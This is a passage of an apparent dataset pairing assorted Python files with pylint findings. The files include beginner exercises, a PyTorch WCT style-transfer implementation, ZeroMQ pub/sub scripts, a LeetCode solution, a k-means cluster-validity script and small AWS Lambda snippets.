18       for num in numbers:
19        sum = sum + num
20       print(sum)
21   add(10,15)
22   add(10,15,20)
23   add(10,15,20,25)
24   """"""
25   #xxagrs
26   def student(**details):
27       print(details)
28   
29   student(id=191,name=""Alex"")","8 - warning: pointless-string-statement
15 - warning: pointless-string-statement
"
"1   def isFirstLastsame(numl):
2       print(""Given List is "",numl)
3       firstElement = numl[0]
4       lastElement = numl[-1]
5       if (firstElement == lastElement):
6           return True
7       else:
8           return False
9   numl = [10,15,12,17,19]
10   print(""Result is "",isFirstLastsame(numl))","1 - warning: redefined-outer-name
5 - refactor: simplifiable-if-statement
5 - refactor: no-else-return
"
"1   
2   num = [10,20,30,40,50]
3   print(num)
4   """"""
5   index = 0
6   n = len(num)
7   while index<n:
8       print(num[index])
9       index = index+1
10   """"""
11   sum = 0
12   for x in num:
13       sum = sum+x
14   print(sum)","11 - warning: redefined-builtin
4 - warning: pointless-string-statement
"
"1   
2   num = list(range(10))
3   print(num)
4   
5   num = list(range(10))
6   j","6 - warning: pointless-statement
6 - error: undefined-variable
"
"1   #Regular method
2   """"""
3   a = 20
4   b = 15
5   print(""a = "",a)
6   print(""b = "",b)
7   temp = a #temp = 20
8   a = b #a = 15
9   b = temp # b = 15
10   
11   print(""After Swapping"")
12   print(""a = "",a)
13   print(""b = "",b)
14   """"""
15   #Python Special Method
16   a = 20
17   b = 15
18   print(""a = "",a)
19   print(""b = "",b)
20   a, b = b, a
21   print(""After Swapping"")
22   print(""a = "",a)
23   print(""b = "",b)","Clean Code: No Issues Detected
"
"1   def multiplication_or_sum(num1,num2):
2       product = num1 * num2
3       if product <= 1000:
4           return product
5       else:
6           return num1 + num2
7   
8   num1 = int(input(""Enter 1st integer number: ""))
9   num2 = int(input(""Enter 2nd integer number: ""))
10   print(""\n"")
11   result = multiplication_or_sum(num1, num2)
12   print(""The result is "", result)
","1 - warning: redefined-outer-name
1 - warning: redefined-outer-name
3 - refactor: no-else-return
"
"1   number = 7536
2   print(""Given number"", number)
3   while (number > 0):
4       digit = number % 10
5       number = number // 10
6       print(digit, end = "" "")","Clean Code: No Issues Detected
"
"1   file = open(""student.txt"",""r"")
2   #print(file.readable())
3   #text = file.read()
4   #print(text)
5   #size = len(text)
6   #print(size)
7   #text = file.readlines()
8   for line in file:
9       print(line)
10   #print(text)
11   file.close()","1 - warning: unspecified-encoding
1 - refactor: consider-using-with
"
"1   def removeChars(str, n):
2     return str[n:]
3   
4   print(""pynative"")
5   n = int(input(""Enter the removing number: ""))
6   print(removeChars(""pynative"", n))
","2 - warning: bad-indentation
1 - warning: redefined-builtin
1 - warning: redefined-outer-name
"
"1   import pyautogui
2   import time
3   message = 100
4   while message > 0:
5       time.sleep(0)
6       pyautogui.typewrite('Hi BC!!!')
7       pyautogui.press('enter')
8       message = message - 1","Clean Code: No Issues Detected
"
"1   def divisible(numl):
2       print(""Given List is "",numl)
3       print(""Divisible of 5 in a list "")
4       for num in numl :
5           if (num % 5 == 0):
6               print(num)
7   
8   numl = [10, 15, 12, 17, 20]
9   divisible(numl)","1 - warning: redefined-outer-name
"
"1   
2   
3   n = int(input(""Enter the last number: ""))
4   sum = 0
5   for x in range(2,n+2,2):
6       sum = sum+x*x
7   print(sum)","4 - warning: redefined-builtin
"
"1   roll = [101,102,103,104,105,106]
2   name = [""Alex Biswas"", ""Sabuj Chandra Das"", ""Ahad Islam Moeen"", ""Sonia Akter"", ""Mariam Akter"", ""Sajib Das""]
3   
4   print(list(zip(roll,name)))
5   print(list(zip(roll,name,""ABCDEF"")))","Clean Code: No Issues Detected
"
"1   import torch
2   from torchvision import transforms
3   from ops import relu_x_1_style_decorator_transform, relu_x_1_transform
4   from PIL import Image
5   import os
6   
7   
8   def eval_transform(size):
9       return transforms.Compose([
10           transforms.Resize(size),
11           transforms.ToTensor()
12       ])
13   
14   
15   def load_image(path):
16       return Image.open(path).convert('RGB')
17   
18   
19   def preprocess(img, size):
20       transform = eval_transform(size)
21       return transform(img).unsqueeze(0)
22   
23   
24   def deprocess(tensor):
25       tensor = tensor.cpu()
26       tensor = tensor.squeeze(0)
27       tensor = torch.clamp(tensor, 0, 1)
28       return transforms.ToPILImage()(tensor)
29   
30   
31   def extract_image_names(path):
32       r_ = []
33       valid_ext = ['.jpg', '.png']
34   
35       items = os.listdir(path)
36   
37       for item in items:
38           item_path = os.path.join(path, item)
39   
40           _, ext = os.path.splitext(item_path)
41           if ext not in valid_ext:
42               continue
43   
44           r_.append(item_path)
45   
46       return r_
","3 - warning: unused-import
3 - warning: unused-import
"
"1   import torch
2   import torch.nn.functional as F
3   
4   
5   def extract_image_patches_(image, kernel_size, strides):
6       kh, kw = kernel_size
7       sh, sw = strides
8       patches = image.unfold(2, kh, sh).unfold(3, kw, sw)
9       patches = patches.permute(0, 2, 3, 1, 4, 5)
10       patches = patches.reshape(-1, *patches.shape[-3:]) # (patch_numbers, C, kh, kw)
11       return patches
12   
13   
14   def style_swap(c_features, s_features, kernel_size, stride=1):
15   
16       s_patches = extract_image_patches_(s_features, [kernel_size, kernel_size], [stride, stride])
17       s_patches_matrix = s_patches.reshape(s_patches.shape[0], -1)
18       s_patch_wise_norm = torch.norm(s_patches_matrix, dim=1)
19       s_patch_wise_norm = s_patch_wise_norm.reshape(-1, 1, 1, 1)
20       s_patches_normalized = s_patches / (s_patch_wise_norm + 1e-8)
21       # Computes the normalized cross-correlations.
22       # At each spatial location, ""K"" is a vector of cross-correlations
23       # between a content activation patch and all style activation patches.
24       K = F.conv2d(c_features, s_patches_normalized, stride=stride)
25       # Replace each vector ""K"" by a one-hot vector corresponding
26       # to the best matching style activation patch.
27       best_matching_idx = K.argmax(1, keepdim=True)
28       one_hot = torch.zeros_like(K)
29       one_hot.scatter_(1, best_matching_idx, 1)
30       # At each spatial location, only the best matching style
31       # activation patch is in the output, as the other patches
32       # are multiplied by zero.
33       F_ss = F.conv_transpose2d(one_hot, s_patches, stride=stride)
34       overlap = F.conv_transpose2d(one_hot, torch.ones_like(s_patches), stride=stride)
35       F_ss = F_ss / overlap
36       return F_ss
37   
38   
39   def relu_x_1_transform(c, s, encoder, decoder, relu_target, alpha=1):
40       c_latent = encoder(c, relu_target)
41       s_latent = encoder(s, relu_target)
42       t_features = wct(c_latent, s_latent, alpha)
43       return decoder(t_features)
44   
45   
46   def relu_x_1_style_decorator_transform(c, s, encoder, decoder, relu_target, kernel_size, stride=1, alpha=1):
47       c_latent = encoder(c, relu_target)
48       s_latent = encoder(s, relu_target)
49       t_features = style_decorator(c_latent, s_latent, kernel_size, stride, alpha)
50       return decoder(t_features)
51   
52   
53   def style_decorator(cf, sf, kernel_size, stride=1, alpha=1):
54       cf_shape = cf.shape
55       sf_shape = sf.shape
56   
57       b, c, h, w = cf_shape
58       cf_vectorized = cf.reshape(c, h * w)
59   
60       b, c, h, w = sf.shape
61       sf_vectorized = sf.reshape(c, h * w)
62   
63       # map features to normalized domain
64       cf_whiten = whitening(cf_vectorized)
65       sf_whiten = whitening(sf_vectorized)
66   
67       # in this normalized domain, we want to align
68       # any element in cf with the nearest element in sf
69       reassembling_f = style_swap(
70           cf_whiten.reshape(cf_shape),
71           sf_whiten.reshape(sf_shape),
72           kernel_size, stride
73       )
74   
75       b, c, h, w = reassembling_f.shape
76       reassembling_vectorized = reassembling_f.reshape(c, h*w)
77       # reconstruct reassembling features into the
78       # domain of the style features
79       result = coloring(reassembling_vectorized, sf_vectorized)
80       result = result.reshape(cf_shape)
81   
82       bland = alpha * result + (1 - alpha) * cf
83       return bland
84   
85   
86   def wct(cf, sf, alpha=1):
87       cf_shape = cf.shape
88   
89       b, c, h, w = cf_shape
90       cf_vectorized = cf.reshape(c, h*w)
91   
92       b, c, h, w = sf.shape
93       sf_vectorized = sf.reshape(c, h*w)
94   
95       cf_transformed = whitening(cf_vectorized)
96       cf_transformed = coloring(cf_transformed, sf_vectorized)
97   
98       cf_transformed = cf_transformed.reshape(cf_shape)
99   
100       bland = alpha * cf_transformed + (1 - alpha) * cf
101       return bland
102   
103   
104   def feature_decomposition(x):
105       x_mean = x.mean(1, keepdims=True)
106       x_center = x - x_mean
107       x_cov = x_center.mm(x_center.t()) / (x_center.size(1) - 1)
108   
109       e, d, _ = torch.svd(x_cov)
110       d = d[d > 0]
111       e = e[:, :d.size(0)]
112   
113       return e, d, x_center, x_mean
114   
115   
116   def whitening(x):
117       e, d, x_center, _ = feature_decomposition(x)
118   
119       transform_matrix = e.mm(torch.diag(d ** -0.5)).mm(e.t())
120       return transform_matrix.mm(x_center)
121   
122   
123   def coloring(x, y):
124       e, d, _, y_mean = feature_decomposition(y)
125   
126       transform_matrix = e.mm(torch.diag(d ** 0.5)).mm(e.t())
127       return transform_matrix.mm(x) + y_mean
","24 - error: not-callable
33 - error: not-callable
34 - error: not-callable
39 - refactor: too-many-arguments
39 - refactor: too-many-positional-arguments
46 - refactor: too-many-arguments
46 - refactor: too-many-positional-arguments
53 - refactor: too-many-locals
57 - warning: unused-variable
89 - warning: unused-variable
"
"1   import torch
2   from models import NormalisedVGG, Decoder
3   from utils import load_image, preprocess, deprocess, extract_image_names
4   from ops import style_decorator, wct
5   import argparse
6   import os
7   
8   
9   parser = argparse.ArgumentParser(description='WCT')
10   
11   parser.add_argument('--content-path', type=str, help='path to the content image')
12   parser.add_argument('--style-path', type=str, help='path to the style image')
13   parser.add_argument('--content-dir', type=str, help='path to the content image folder')
14   parser.add_argument('--style-dir', type=str, help='path to the style image folder')
15   
16   parser.add_argument('--style-decorator', type=int, default=1)
17   parser.add_argument('--kernel-size', type=int, default=12)
18   parser.add_argument('--stride', type=int, default=1)
19   parser.add_argument('--alpha', type=float, default=0.8)
20   parser.add_argument('--ss-alpha', type=float, default=0.6)
21   parser.add_argument('--synthesis', type=int, default=0, help='0-transfer, 1-synthesis')
22   
23   parser.add_argument('--encoder-path', type=str, default='encoder/vgg_normalised_conv5_1.pth')
24   parser.add_argument('--decoders-dir', type=str, default='decoders')
25   
26   parser.add_argument('--save-dir', type=str, default='./results')
27   parser.add_argument('--save-name', type=str, default='result', help='save name for single output image')
28   parser.add_argument('--save-ext', type=str, default='jpg', help='The extension name of the output image')
29   
30   parser.add_argument('--content-size', type=int, default=768, help='New (minimum) size for the content image')
31   parser.add_argument('--style-size', type=int, default=768, help='New (minimum) size for the style image')
32   parser.add_argument('--gpu', type=int, default=0, help='ID of the GPU to use; for CPU mode set --gpu = -1')
33   
34   args = parser.parse_args()
35   
36   assert args.content_path is not None or args.content_dir is not None, \
37       'Either --content-path or --content-dir should be given.'
38   assert args.style_path is not None or args.style_dir is not None, \
39       'Either --style-path or --style-dir should be given.'
40   
41   device = torch.device('cuda:%s' % args.gpu if torch.cuda.is_available() and args.gpu != -1 else 'cpu')
42   
43   encoder = NormalisedVGG(pretrained_path=args.encoder_path).to(device)
44   d5 = Decoder('relu5_1', pretrained_path=os.path.join(args.decoders_dir, 'd5.pth')).to(device)
45   d4 = Decoder('relu4_1', pretrained_path=os.path.join(args.decoders_dir, 'd4.pth')).to(device)
46   d3 = Decoder('relu3_1', pretrained_path=os.path.join(args.decoders_dir, 'd3.pth')).to(device)
47   d2 = Decoder('relu2_1', pretrained_path=os.path.join(args.decoders_dir, 'd2.pth')).to(device)
48   d1 = Decoder('relu1_1', pretrained_path=os.path.join(args.decoders_dir, 'd1.pth')).to(device)
49   
50   
51   def style_transfer(content, style):
52   
53       if args.style_decorator:
54           relu5_1_cf = encoder(content, 'relu5_1')
55           relu5_1_sf = encoder(style, 'relu5_1')
56           relu5_1_scf = style_decorator(relu5_1_cf, relu5_1_sf, args.kernel_size, args.stride, args.ss_alpha)
57           relu5_1_recons = d5(relu5_1_scf)
58       else:
59           relu5_1_cf = encoder(content, 'relu5_1')
60           relu5_1_sf = encoder(style, 'relu5_1')
61           relu5_1_scf = wct(relu5_1_cf, relu5_1_sf, args.alpha)
62           relu5_1_recons = d5(relu5_1_scf)
63   
64       relu4_1_cf = encoder(relu5_1_recons, 'relu4_1')
65       relu4_1_sf = encoder(style, 'relu4_1')
66       relu4_1_scf = wct(relu4_1_cf, relu4_1_sf, args.alpha)
67       relu4_1_recons = d4(relu4_1_scf)
68   
69       relu3_1_cf = encoder(relu4_1_recons, 'relu3_1')
70       relu3_1_sf = encoder(style, 'relu3_1')
71       relu3_1_scf = wct(relu3_1_cf, relu3_1_sf, args.alpha)
72       relu3_1_recons = d3(relu3_1_scf)
73   
74       relu2_1_cf = encoder(relu3_1_recons, 'relu2_1')
75       relu2_1_sf = encoder(style, 'relu2_1')
76       relu2_1_scf = wct(relu2_1_cf, relu2_1_sf, args.alpha)
77       relu2_1_recons = d2(relu2_1_scf)
78   
79       relu1_1_cf = encoder(relu2_1_recons, 'relu1_1')
80       relu1_1_sf = encoder(style, 'relu1_1')
81       relu1_1_scf = wct(relu1_1_cf, relu1_1_sf, args.alpha)
82       relu1_1_recons = d1(relu1_1_scf)
83   
84       return relu1_1_recons
85   
86   
87   if not os.path.exists(args.save_dir):
88       print('Creating save folder at', args.save_dir)
89       os.mkdir(args.save_dir)
90   
91   content_paths = []
92   style_paths = []
93   
94   if args.content_dir:
95       # use a batch of content images
96       content_paths = extract_image_names(args.content_dir)
97   else:
98       # use a single content image
99       content_paths.append(args.content_path)
100   
101   if args.style_dir:
102       # use a batch of style images
103       style_paths = extract_image_names(args.style_dir)
104   else:
105       # use a single style image
106       style_paths.append(args.style_path)
107   
108   print('Number content images:', len(content_paths))
109   print('Number style images:', len(style_paths))
110   
111   with torch.no_grad():
112   
113       for i in range(len(content_paths)):
114           content = load_image(content_paths[i])
115           content = preprocess(content, args.content_size)
116           content = content.to(device)
117   
118           for j in range(len(style_paths)):
119               style = load_image(style_paths[j])
120               style = preprocess(style, args.style_size)
121               style = style.to(device)
122   
123               if args.synthesis == 0:
124                   output = style_transfer(content, style)
125                   output = deprocess(output)
126   
127                   if len(content_paths) == 1 and len(style_paths) == 1:
128                       # used a single content and style image
129                       save_path = '%s/%s.%s' % (args.save_dir, args.save_name, args.save_ext)
130                   else:
131                       # used a batch of content and style images
132                       save_path = '%s/%s_%s.%s' % (args.save_dir, i, j, args.save_ext)
133   
134                   print('Output image saved at:', save_path)
135                   output.save(save_path)
136               else:
137                   content = torch.rand(*content.shape).uniform_(0, 1).to(device)
138                   for iteration in range(3):
139                       output = style_transfer(content, style)
140                       content = output
141                       output = deprocess(output)
142   
143                       if len(content_paths) == 1 and len(style_paths) == 1:
144                           # used a single content and style image
145                           save_path = '%s/%s_%s.%s' % (args.save_dir, args.save_name, iteration, args.save_ext)
146                       else:
147                           # used a batch of content and style images
148                           save_path = '%s/%s_%s_%s.%s' % (args.save_dir, i, j, iteration, args.save_ext)
149   
150                       print('Output image saved at:', save_path)
151                       output.save(save_path)
","51 - refactor: too-many-locals
51 - warning: redefined-outer-name
51 - warning: redefined-outer-name
"
"1   import torch
2   import torch.nn as nn
3   import copy
4   
5   
6   normalised_vgg_relu5_1 = nn.Sequential(
7       nn.Conv2d(3, 3, 1),
8       nn.ReflectionPad2d((1, 1, 1, 1)),
9       nn.Conv2d(3, 64, 3),
10       nn.ReLU(),
11       nn.ReflectionPad2d((1, 1, 1, 1)),
12       nn.Conv2d(64, 64, 3),
13       nn.ReLU(),
14       nn.MaxPool2d(2, ceil_mode=True),
15       nn.ReflectionPad2d((1, 1, 1, 1)),
16       nn.Conv2d(64, 128, 3),
17       nn.ReLU(),
18       nn.ReflectionPad2d((1, 1, 1, 1)),
19       nn.Conv2d(128, 128, 3),
20       nn.ReLU(),
21       nn.MaxPool2d(2, ceil_mode=True),
22       nn.ReflectionPad2d((1, 1, 1, 1)),
23       nn.Conv2d(128, 256, 3),
24       nn.ReLU(),
25       nn.ReflectionPad2d((1, 1, 1, 1)),
26       nn.Conv2d(256, 256, 3),
27       nn.ReLU(),
28       nn.ReflectionPad2d((1, 1, 1, 1)),
29       nn.Conv2d(256, 256, 3),
30       nn.ReLU(),
31       nn.ReflectionPad2d((1, 1, 1, 1)),
32       nn.Conv2d(256, 256, 3),
33       nn.ReLU(),
34       nn.MaxPool2d(2, ceil_mode=True),
35       nn.ReflectionPad2d((1, 1, 1, 1)),
36       nn.Conv2d(256, 512, 3),
37       nn.ReLU(),
38       nn.ReflectionPad2d((1, 1, 1, 1)),
39       nn.Conv2d(512, 512, 3),
40       nn.ReLU(),
41       nn.ReflectionPad2d((1, 1, 1, 1)),
42       nn.Conv2d(512, 512, 3),
43       nn.ReLU(),
44       nn.ReflectionPad2d((1, 1, 1, 1)),
45       nn.Conv2d(512, 512, 3),
46       nn.ReLU(),
47       nn.MaxPool2d(2, ceil_mode=True),
48       nn.ReflectionPad2d((1, 1, 1, 1)),
49       nn.Conv2d(512, 512, 3),
50       nn.ReLU()
51   )
52   
53   
54   class NormalisedVGG(nn.Module):
55   
56       def __init__(self, pretrained_path=None):
57           super().__init__()
58           self.net = normalised_vgg_relu5_1
59           if pretrained_path is not None:
60               self.net.load_state_dict(torch.load(pretrained_path, map_location=lambda storage, loc: storage))
61   
62       def forward(self, x, target):
63           if target == 'relu1_1':
64               return self.net[:4](x)
65           elif target == 'relu2_1':
66               return self.net[:11](x)
67           elif target == 'relu3_1':
68               return self.net[:18](x)
69           elif target == 'relu4_1':
70               return self.net[:31](x)
71           elif target == 'relu5_1':
72               return self.net(x)
73   
74   
75   vgg_decoder_relu5_1 = nn.Sequential(
76       nn.ReflectionPad2d((1, 1, 1, 1)),
77       nn.Conv2d(512, 512, 3),
78       nn.ReLU(),
79       nn.Upsample(scale_factor=2),
80       nn.ReflectionPad2d((1, 1, 1, 1)),
81       nn.Conv2d(512, 512, 3),
82       nn.ReLU(),
83       nn.ReflectionPad2d((1, 1, 1, 1)),
84       nn.Conv2d(512, 512, 3),
85       nn.ReLU(),
86       nn.ReflectionPad2d((1, 1, 1, 1)),
87       nn.Conv2d(512, 512, 3),
88       nn.ReLU(),
89       nn.ReflectionPad2d((1, 1, 1, 1)),
90       nn.Conv2d(512, 256, 3),
91       nn.ReLU(),
92       nn.Upsample(scale_factor=2),
93       nn.ReflectionPad2d((1, 1, 1, 1)),
94       nn.Conv2d(256, 256, 3),
95       nn.ReLU(),
96       nn.ReflectionPad2d((1, 1, 1, 1)),
97       nn.Conv2d(256, 256, 3),
98       nn.ReLU(),
99       nn.ReflectionPad2d((1, 1, 1, 1)),
100       nn.Conv2d(256, 256, 3),
101       nn.ReLU(),
102       nn.ReflectionPad2d((1, 1, 1, 1)),
103       nn.Conv2d(256, 128, 3),
104       nn.ReLU(),
105       nn.Upsample(scale_factor=2),
106       nn.ReflectionPad2d((1, 1, 1, 1)),
107       nn.Conv2d(128, 128, 3),
108       nn.ReLU(),
109       nn.ReflectionPad2d((1, 1, 1, 1)),
110       nn.Conv2d(128, 64, 3),
111       nn.ReLU(),
112       nn.Upsample(scale_factor=2),
113       nn.ReflectionPad2d((1, 1, 1, 1)),
114       nn.Conv2d(64, 64, 3),
115       nn.ReLU(),
116       nn.ReflectionPad2d((1, 1, 1, 1)),
117       nn.Conv2d(64, 3, 3)
118       )
119   
120   
121   class Decoder(nn.Module):
122       def __init__(self, target, pretrained_path=None):
123           super().__init__()
124           if target == 'relu1_1':
125               self.net = nn.Sequential(*copy.deepcopy(list(vgg_decoder_relu5_1.children())[-5:]))    # current -2
126           elif target == 'relu2_1':
127               self.net = nn.Sequential(*copy.deepcopy(list(vgg_decoder_relu5_1.children())[-9:]))
128           elif target == 'relu3_1':
129               self.net = nn.Sequential(*copy.deepcopy(list(vgg_decoder_relu5_1.children())[-16:]))
130           elif target == 'relu4_1':
131               self.net = nn.Sequential(*copy.deepcopy(list(vgg_decoder_relu5_1.children())[-29:]))
132           elif target == 'relu5_1':
133               self.net = nn.Sequential(*copy.deepcopy(list(vgg_decoder_relu5_1.children())))
134   
135           if pretrained_path is not None:
136               self.net.load_state_dict(torch.load(pretrained_path, map_location=lambda storage, loc: storage))
137   
138       def forward(self, x):
139           return self.net(x)
","2 - refactor: consider-using-from-import
63 - refactor: no-else-return
62 - refactor: inconsistent-return-statements
"
"1   import zmq
2   
3   PUB_ADDR = 'ipc:///tmp/pub';
4   SUB_ADDR = 'ipc:///tmp/sub';
5   
6   class zcomm:
7   
8       def __init__(self):
9           self.ctx = zmq.Context()
10           self.pub = self.ctx.socket(zmq.PUB)
11           self.pub.connect(PUB_ADDR)
12           self.sub = self.ctx.socket(zmq.SUB)
13           self.sub.connect(SUB_ADDR)
14           self.callbacks = {} # maps channels -> callbacks
15   
16       def subscribe(self, channel, callback):
17           self.sub.setsockopt(zmq.SUBSCRIBE, channel)
18           self.callbacks[channel] = callback
19   
20       def publish(self, channel, data):
21           self.pub.send_multipart([channel, data])
22   
23       def handle(self):
24           channel, msg = self.sub.recv_multipart()
25           if channel in self.callbacks:
26               self.callbacks[channel](channel, msg)
27           elif '' in self.callbacks:
28               self.callbacks[''](channel, msg)
29   
30       def run(self):
31           while True:
32               self.handle()
","3 - warning: unnecessary-semicolon
4 - warning: unnecessary-semicolon
"
"1   #!/usr/bin/env python
2   import itertools
3   import sys
4   import time
5   from zcomm import zcomm
6   
7   HZ = 1
8   
9   def main(argv):
10       z = zcomm()
11   
12       msg_counter = itertools.count()
13       while True:
14           msg = str(msg_counter.next())
15           z.publish('FROB_DATA', msg);
16           time.sleep(1/float(HZ))
17   
18   if __name__ == ""__main__"":
19       try:
20           main(sys.argv)
21       except KeyboardInterrupt:
22           pass
","15 - warning: unnecessary-semicolon
14 - error: no-member
9 - warning: unused-argument
"
"1   #!/usr/bin/env python
2   import sys
3   import time
4   from zcomm import zcomm
5   
6   def handle_msg(channel, data):
7       print '   channel:%s, data:%s' % (channel, data)
8   
9   def main(argv):
10       z = zcomm()
11       z.subscribe('', handle_msg)
12       z.run()
13   
14   if __name__ == ""__main__"":
15       try:
16           main(sys.argv)
17       except KeyboardInterrupt:
18           pass
","7 - error: syntax-error
"
"1   #!/usr/bin/env python
2   import zmq
3   
4   SUB_ADDR = 'ipc:///tmp/sub'
5   PUB_ADDR = 'ipc:///tmp/pub'
6   
7   def main():
8   
9       try:
10           context = zmq.Context(1)
11   
12           userpub = context.socket(zmq.SUB)
13           userpub.bind(PUB_ADDR)
14           userpub.setsockopt(zmq.SUBSCRIBE, """")
15   
16           usersub = context.socket(zmq.PUB)
17           usersub.bind(SUB_ADDR)
18   
19           zmq.device(zmq.FORWARDER, userpub, usersub)
20       except Exception, e:
21           print e
22           print ""bringing down zmq device""
23       except KeyboardInterrupt:
24           pass
25       finally:
26           pass
27           userpub.close()
28           usersub.close()
29           context.term()
30   
31   if __name__ == ""__main__"":
32       main()
","20 - error: syntax-error
"
"1   # AC:
2   # from others' solution
3   #
4   class Solution(object):
5       def distinctEchoSubstrings(self, S):
6           N = len(S)
7           P, MOD = 37, 344555666677777  # MOD is prime
8           Pinv = pow(P, MOD - 2, MOD)
9           
10           prefix = [0]
11           pwr = 1
12           ha = 0
13           
14           for x in map(ord, S):
15               ha = (ha + pwr * x) % MOD
16               pwr = pwr * P % MOD
17               prefix.append(ha)
18           
19           seen = set()
20           pwr = 1
21           for length in range(1, N // 2 + 1):
22               pwr = pwr * P % MOD  # pwr = P^length
23               for i in range(N - 2 * length + 1):
24                   left = (prefix[i + length] - prefix[i]) * pwr % MOD  # hash of s[i:i+length] * P^length
25                   right = (prefix[i + 2 * length] - prefix[i + length]) % MOD  # hash of s[i+length:i+2*length]
26                   if left == right:
27                       seen.add(left * pow(Pinv, i, MOD) % MOD)  # left * P^-i  is the canonical representation
28           return len(seen)","4 - refactor: useless-object-inheritance
4 - refactor: too-few-public-methods
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   Created on Wed Oct 24 09:50:29 2018
4   
5   @author: fd
6   """"""
7   
8   import json
9   
10   dic = {
11       ""真实流量测试"":
12           {
13               ""dspflow"": [""flow.pcap""],
14   
15               ""flow"": [""flow2.pcap"", ""3.pcap""],
16           },
17   
18       ""恶意流量测试"":
19           {
20               ""情况1"": [""6.pcap""],
21   
22               ""情况2"": [""7.pcap"", ""8.pcap""],
23               ""情况3"": [""9.pcap"", ""10.pcap""],
24           },
25       ""具体流量测试"":
26           {
27               ""ARP"": [""arp.pcap""],
28               ""DB2"": [""db2.pcap""],
29               ""DNS"": [""dns.pcap""],
30               ""FTP"": [""dns.pcap""],
31               ""HTTP"": [""http.pcap""],
32               ""HTTPS"": [""https.pcap""],
33               ""MEMCACHE"": [""memcached.pcap""],
34               ""MONGO"": [""mongo.pcap""],
35               ""MYSQL"": [""mysql.pcap""],
36               ""ORACLE"": [""oracle.pcap""],
37               ""REDIS"": [""redis.pcap""],
38               ""SMTP"": [""smtp.pcap""],
39               ""SNMPv1"": [""snmp1.pcap""],
40               ""SNMPv2"": [""snmp2.pcap""],
41               ""SNMPv3"": [""snmp3.pcap""],
42               ""SSH"": [""ssh.pcap""],
43               ""SSL"": [""ssl.pcap""],
44               ""SYBASE"": [""sybase.pcap""],
45               ""TELNET"": [""telnet.pcap""],
46               ""UDP"": [""udp.pcap""],
47               ""VLAN"": [""vlan.pcap""],
48           }
49   
50   }
51   with open(""config.json"",""w"") as dump_f:
52       json.dump(dic,dump_f,ensure_ascii=False)
53   
54   with open('config.json', 'r') as json_file:
55       """"""
56       读取该json文件时，先按照gbk的方式对其解码再编码为utf-8的格式
57       """"""
58       data = json_file.read()
59       print(type(data))    # type(data) = 'str'
60       result = json.loads(data)
61       print(result)
","51 - warning: unspecified-encoding
54 - warning: unspecified-encoding
55 - warning: pointless-string-statement
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   Created on Tue Nov 27 20:07:59 2018
4   
5   @author: Imen
6   """"""
7   
8   import numpy as np
9   import pandas as pd
10   from sklearn.cluster import KMeans
11   import matplotlib.pyplot as plt
12   from sklearn.datasets.samples_generator import make_blobs
13   
14   #Create a database of random values of 4 features and a fixed number of clusters 
15   n_clusters=6
16   dataset,y=make_blobs(n_samples=200,n_features=4,centers=n_clusters)
17   #plt.scatter(dataset[:,2],dataset[:,3])
18   
19   #Firstly,i will calculate Vsc for this number of clusters
20   #Create the k-means 
21   kmeans=KMeans(init=""k-means++"",n_clusters=n_clusters,random_state=0)
22   kmeans.fit(dataset)
23   mu_i=kmeans.cluster_centers_
24   k_means_labels=kmeans.labels_
25   mu=dataset.mean(axis=0)
26   SB=np.zeros((4,4))
27   for line in mu_i:
28       diff1=line.reshape(1,4)-mu.reshape(1,4)
29       diff2=np.transpose(line.reshape(1,4)-mu.reshape(1,4))
30       SB+=diff1*diff2
31   Sw=np.zeros((4,4))
32   sum_in_cluster=np.zeros((4,4))
33   comp_c=0
34   for k in range(n_clusters):
35       mes_points=(k_means_labels==k)
36       cluster_center=mu_i[k]
37       for i in dataset[mes_points]:
38           diff11=i.reshape(1,4)-cluster_center.reshape(1,4)
39           diff22=np.transpose(i.reshape(1,4)-cluster_center.reshape(1,4))
40           sum_in_cluster+=diff11*diff22
41       Sw+=sum_in_cluster
42       comp_c+=np.trace(Sw)
43   
44   sep_c=np.trace(SB)
45   Vsc=sep_c/comp_c
46   print(""For n_clusters="",n_clusters,"" => Vsc="",Vsc)
47   
48   #Secondly,i will determine Vsc for each number of cluster from 2 to 10
49   #Define a function validity_index
50   def validity_index(c):
51       kmeans=KMeans(init=""k-means++"",n_clusters=c,random_state=0)
52       kmeans.fit(dataset)
53       #mu_i is the centers of clusters
54       mu_i=kmeans.cluster_centers_
55       k_means_labels=kmeans.labels_
56       #mu is the center of the whole dataset
57       mu=dataset.mean(axis=0)
58       #initialize the between clusters matrix
59       SB=np.zeros((4,4))
60       for line in mu_i:
61           diff1=line.reshape(1,4)-mu.reshape(1,4)
62           diff2=np.transpose(line.reshape(1,4)-mu.reshape(1,4))
63           SB+=diff1*diff2
64       comp_c=0
65       #initialize the within matrix
66       Sw=np.zeros((4,4))
67       sum_in_cluster=np.zeros((4,4))
68       for k in range(c):
69           mes_points=(k_means_labels==k)
70           cluster_center=mu_i[k]
71           for i in dataset[mes_points]:
72               diff11=i.reshape(1,4)-cluster_center.reshape(1,4)
73               diff22=np.transpose(i.reshape(1,4)-cluster_center.reshape(1,4))
74               sum_in_cluster+=diff11*diff22
75           Sw+=sum_in_cluster
76           #calculate the compactness in each cluster
77           comp_c+=np.trace(Sw)
78       #define the separation between clusters
79       sep_c=np.trace(SB)
80       #determin the Vsc
81       Vsc=sep_c/comp_c
82       return Vsc
83   #We have to find that the max Vsc is for the n_cluster defined initially
84   Vsc_vector=[]
85   cc=[2,3,4,5,6,7,8,9,10]
86   for i in cc:
87       Vsc_vector.append(validity_index(i))
88   print(""Number of clusters which has max of Vsc:"",Vsc_vector.index(max(Vsc_vector))+2 ,""=> Vsc="",max(Vsc_vector))
","50 - refactor: too-many-locals
51 - warning: redefined-outer-name
54 - warning: redefined-outer-name
55 - warning: redefined-outer-name
57 - warning: redefined-outer-name
59 - warning: redefined-outer-name
60 - warning: redefined-outer-name
61 - warning: redefined-outer-name
62 - warning: redefined-outer-name
64 - warning: redefined-outer-name
66 - warning: redefined-outer-name
67 - warning: redefined-outer-name
68 - warning: redefined-outer-name
69 - warning: redefined-outer-name
70 - warning: redefined-outer-name
71 - warning: redefined-outer-name
72 - warning: redefined-outer-name
73 - warning: redefined-outer-name
79 - warning: redefined-outer-name
81 - warning: redefined-outer-name
9 - warning: unused-import
11 - warning: unused-import
"
1   AWS_SCIPY_ARN = 'arn:aws:lambda:region:account_id:layer:AWSLambda-Python37-SciPy1x:2',"Clean Code: No Issues Detected
"
"1   def lambda_handler(event, context):
2       if event['parallel_no'] % 2 == 0:
3           raise Exception('偶数です')
4   
5       return {
6           'message': event['message'],
7           'const_value': event['const_value']
8       }
","3 - warning: broad-exception-raised
